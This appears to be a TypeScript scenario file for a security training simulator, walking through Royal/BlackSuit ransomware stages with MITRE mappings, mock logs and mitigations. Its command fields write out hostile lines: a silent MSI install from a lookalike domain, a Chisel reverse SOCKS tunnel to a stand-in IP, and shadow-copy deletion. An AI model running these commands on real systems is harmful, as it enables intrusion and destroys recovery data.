import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'royal-blacksuit-ransomware-chacha20-restartmanager',
    title: 'CISA AA23-061A / AA24-219A & Unit 42 — Royal & BlackSuit Ransomware: Callback Phishing, Windows Restart Manager File Unlock & OpenSSL Partial Encryption',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Grounded in CISA/FBI Joint Advisories AA23-061A (Royal Ransomware) and AA24-219A (BlackSuit Ransomware): operators gain initial access via callback phishing or BatLoader SEO poisoning, use Windows Restart Manager APIs (RstrtMgr.dll!RmStartSession & RmShutdown) to forcibly unlock active SQL/VHDX files without crashing the OS, and execute OpenSSL AES-256-CBC / ChaCha20 percentage-based partial encryption (-ep).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Royal / BlackSuit Operator (Chisel / RDP)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'BatLoader / Callback RMM Staging', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Windows Server (RstrtMgr.dll File Unlocker)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'CISA AA24-219A / Unit 42 EDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Database & File Shares (.royal / .blacksuit)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Callback Phishing / BatLoader RMM Delivery & Chisel Reverse Tunneling',
        narration:
          'Royal/BlackSuit affiliates lure employees via subscription-cancellation callback phishing emails or trojanized MSI installers (BatLoader) into launching legitimate remote management tools (Syncro, AnyDesk, Atera), then deploy `chisel.exe` and `adfind.exe` to map Active Directory trusts and file servers.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access & Discovery (T1219 - Remote Access Software / T1087.002)',
        technicalCommands: [
          'msiexec.exe /i "https://cdn-zoom-update.com/ZoomInstallerFull.msi" /qn (BatLoader MSI staging)',
          'adfind.exe -f "(objectcategory=computer)" && chisel.exe client 198.51.100.88:8443 R:socks',
        ],
        defenseMitigation:
          'Block unauthorized RMM binaries (AnyDesk, Atera, Syncro) via WDAC/AppLocker and alert on `adfind.exe` LDAP enumeration flags (`-f (objectcategory=...)`).',
        logs: [
          {
            id: 'royal-1',
            timestamp: '02:05:11.330',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'adfind.exe',
            CommandLine: 'C:\\Users\\Public\\adfind.exe -f (objectcategory=computer)',
            raw: 'EventID: 1 | ParentImage: C:\\ProgramData\\AnyDesk.exe | Image: C:\\Users\\Public\\adfind.exe | CommandLine: adfind.exe -f (objectcategory=computer) | Tunnel: chisel.exe reverse SOCKS5 | Advisory: CISA AA23-061A / AA24-219A',
            parsedFields: {
              InitialVector: 'Callback Phishing / BatLoader MSI',
              ReconTool: 'AdFind.exe Active Directory Enumeration',
              TunnelTool: 'Chisel SOCKS5 Proxy',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: vssadmin Shadow Wipe & Windows Restart Manager (RstrtMgr.dll) File Lock Release',
        narration:
          'Upon execution (`royal.exe -id <32_char_id> -ep 50`), the binary deletes Volume Shadow Copies via `vssadmin.exe` and invokes the Windows Restart Manager API (`RmStartSession`, `RmRegisterResources`, `RmGetList`, and `RmShutdown` in `C:\\Windows\\System32\\RstrtMgr.dll`) to automatically identify and terminate any application or service holding an open file handle on target database or virtual disk files.',
        activeNodes: ['target', 'siem'],
        mitreTactic: 'Impact Preparation (T1489 - Service Stop / T1490 - Inhibit System Recovery)',
        technicalCommands: [
          'vssadmin.exe delete shadows /all /quiet',
          'RstrtMgr.dll!RmStartSession(&dwSession, 0, szSessionKey) -> RmRegisterResources() -> RmShutdown(dwSession, RmForceShutdown, NULL)',
        ],
        defenseMitigation:
          'Monitor Windows Application Event Log ID `10000` / `10001` (`RestartManager` session initiation by non-installer processes from `C:\\Users` or `C:\\Windows\\Temp`).',
        logs: [
          {
            id: 'royal-2',
            timestamp: '02:09:41.780',
            source: 'Windows Event Log',
            severity: 'critical',
            EventCode: 10000,
            ProcessName: 'blacksuit.exe',
            raw: 'LogName: Application | Source: Microsoft-Windows-RestartManager | EventID: 10000 | Message: Starting session 0 - 2026-11-17T02:09:41Z. Controlling Process: C:\\Windows\\Temp\\blacksuit.exe | TerminatedLockHolders: sqlservr.exe, vmms.exe',
            parsedFields: {
              ApiAbused: 'RstrtMgr.dll (RmStartSession / RmRegisterResources / RmShutdown)',
              EventLogSignature: 'Microsoft-Windows-RestartManager EventID 10000',
              UnlockedTargets: 'SQL Server .mdf/.ldf and Hyper-V .vhdx files',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: OpenSSL AES-256-CBC Percentage-Based Partial Encryption (-ep) Across Shares',
        narration:
          'Using statically linked OpenSSL routines and a multi-threaded I/O completion port queue (2× CPU core count), Royal/BlackSuit encrypts files using AES-256-CBC and RSA-4096. Controlled by the `-ep <1..100>` flag, files larger than 5.24 MB undergo intermittent percentage-based encryption to maximize speed before appending `.royal` or `.blacksuit` and dropping `README.royal.txt`.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact)',
        technicalCommands: [
          'blacksuit.exe -id 9A4F8C2E1B7D0A3E5F6C8B1D2E3F4A5B -path "\\\\corp-dc01\\shares" -ep 50',
          'OpenSSL EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), ...) -> Rename to *.blacksuit & write README.BlackSuit.txt',
        ],
        defenseMitigation:
          'Deploy canary files on SMB shares, enforce host firewall rules blocking workstation-to-workstation SMB (TCP 445), and maintain offline immutable backups.',
        logs: [
          {
            id: 'royal-3',
            timestamp: '02:14:05.912',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'blacksuit.exe',
            raw: 'EventID: 11 | Image: C:\\Windows\\Temp\\blacksuit.exe | CommandLine: blacksuit.exe -id 9A4F... -ep 50 | TargetFilename: D:\\SQLData\\README.BlackSuit.txt | Cipher: OpenSSL AES-256-CBC (50% Intermittent Stride) + RSA-4096',
            parsedFields: {
              RansomwareLineage: 'Conti -> Royal -> BlackSuit (CISA AA24-219A)',
              CryptoEngine: 'Statically linked OpenSSL AES-256-CBC + RSA-4096',
              EncryptionPercentageFlag: '-ep 50 (50% Intermittent Stride)',
            },
          },
        ],
        packets: [],
      },
    ],
  };
